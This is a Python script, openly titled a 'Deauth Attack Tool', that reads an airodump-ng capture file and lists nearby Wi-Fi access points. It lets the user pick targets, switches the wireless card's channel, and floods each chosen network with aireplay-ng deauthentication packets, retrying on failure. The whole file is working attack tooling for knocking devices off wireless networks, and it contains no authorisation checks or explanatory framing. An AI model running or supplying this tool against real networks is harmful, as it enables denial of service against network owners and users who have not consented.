#!/usr/bin/env python3

import argparse
import csv
import os
import signal
import subprocess
import sys
from typing import List, Tuple

RED = "\033[38;2;255;0;0m"
RESET = "\033[0m"
BOLD = "\033[1m"

DEFAULT_INTERFACE = "wlan0mon"
DEFAULT_DEAUTH_COUNT = 20
DEFAULT_PWR_THRESHOLD = 80
MAX_ATTEMPTS = 3

stopAttack = False

def ParseCSV(csvFile: str, pwrThreshold: int) -> List[Tuple[str, str, int, str]]:
    aps = []
    with open(csvFile, newline='', encoding='utf-8', errors='ignore') as f:
        reader = csv.reader(f)
        for row in reader:
            if row and row[0].strip() == "Station MAC":
                break
            if len(row) < 14 or row[0].startswith("BSSID"):
                continue
            try:
                bssid = row[0].strip()
                channel = row[3].strip()
                pwr = int(row[8].strip())
                essid = row[13].strip()
            except ValueError:
                continue
            if abs(pwr) <= pwrThreshold:
                aps.append((bssid, channel, pwr, essid))
    return aps

def ChangeChannel(interface: str, channel: str):
    subprocess.run(["iwconfig", interface, "channel", channel], check=True)

def RunDeauth(interface: str, bssid: str, count: int):
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, interface]
    subprocess.run(cmd, check=True)

def AttemptDeauth(interface: str, bssid: str, channel: str, count: int, attempt: int) -> bool:
    print(f"{BOLD}Attempt {attempt}/{MAX_ATTEMPTS}{RESET} → {bssid} on channel {channel}")
    ChangeChannel(interface, channel)
    try:
        RunDeauth(interface, bssid, count)
        return True
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Error: {e}{RESET}")
        return False

def DeauthWorkflow(interface: str, deauthCount: int, csvFile: str, pwrThreshold: int):
    global stopAttack

    if not os.path.isfile(csvFile):
        print(f"{RED}[!] File not found: {csvFile}{RESET}")
        return

    aps = ParseCSV(csvFile, pwrThreshold)
    if not aps:
        print(f"{RED}[!] No APs ≤ {pwrThreshold} dBm in {csvFile}{RESET}")
        return

    print(f"\nTargets (PWR ≤ {pwrThreshold} dBm):")
    for i, (bssid, channel, pwr, essid) in enumerate(aps, start=1):
        name = essid or "<hidden>"
        print(f" {BOLD}{i}{RESET}. {name} | BSSID: {bssid} | CH: {channel} | PWR: {pwr}")

    sel = input(f"\n{BOLD}Select networks (e.g. 1,3): {RESET}").strip()
    try:
        choices = [int(x) for x in sel.split(",") if x]
    except ValueError:
        print(f"{RED}[!] Invalid selection.{RESET}")
        return

    for choice in choices:
        if stopAttack:
            break
        if choice < 1 or choice > len(aps):
            print(f"{RED}[!] {choice} out of range, skipping.{RESET}")
            continue
        bssid, channel, _, essid = aps[choice - 1]
        name = essid or "<hidden>"
        print(f"\n>>> Attacking {BOLD}{name}{RESET} ({bssid}) on CH {channel}")
        for attempt in range(1, MAX_ATTEMPTS + 1):
            if stopAttack:
                break
            success = AttemptDeauth(interface, bssid, channel, deauthCount, attempt)
            if success:
                print(f"{BOLD}[+] Success on attempt {attempt}.{RESET}")
                break
            if attempt == MAX_ATTEMPTS:
                print(f"{RED}[-] Failed after {MAX_ATTEMPTS}.{RESET}")
            else:
                print(f"{BOLD}[*] Retrying...{RESET}")

    print(f"\n{BOLD}Done.{RESET}")

def menu():
    interface = input(f"{BOLD}Interface [{DEFAULT_INTERFACE}]: {RESET}").strip() or DEFAULT_INTERFACE
    try:
        count = int(input(f"{BOLD}Deauth packets [{DEFAULT_DEAUTH_COUNT}]: {RESET}").strip())
    except ValueError:
        count = DEFAULT_DEAUTH_COUNT
    try:
        pwrThreshold = int(input(f"{BOLD}PWR threshold [{DEFAULT_PWR_THRESHOLD}]: {RESET}").strip())
    except ValueError:
        pwrThreshold = DEFAULT_PWR_THRESHOLD
    csvFile = input(f"{BOLD}Airodump CSV file: {RESET}").strip()
    DeauthWorkflow(interface, count, csvFile, pwrThreshold)

def terminal():
    parser = argparse.ArgumentParser(description="Deauth Attack Tool")
    parser.add_argument("-i", "--interface", default=DEFAULT_INTERFACE,
                        help=f"Wireless interface (default: {DEFAULT_INTERFACE})")
    parser.add_argument("-c", "--count", type=int, default=DEFAULT_DEAUTH_COUNT,
                        help=f"Deauth packets (default: {DEFAULT_DEAUTH_COUNT})")
    parser.add_argument("-f", "--file", required=True,
                        help="Airodump-ng CSV filename")
    parser.add_argument("-p", "--pwr", type=int, default=DEFAULT_PWR_THRESHOLD,
                        help=f"PWR threshold in dBm (default: {DEFAULT_PWR_THRESHOLD})")
    args = parser.parse_args()
    DeauthWorkflow(args.interface, args.count, args.file, args.pwr)

def SignalHandler(sig, frame):
    global stopAttack
    print(f"\n{RED}[!] Stopping attack...{RESET}")
    stopAttack = True

def main():
    signal.signal(signal.SIGINT, SignalHandler)
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()
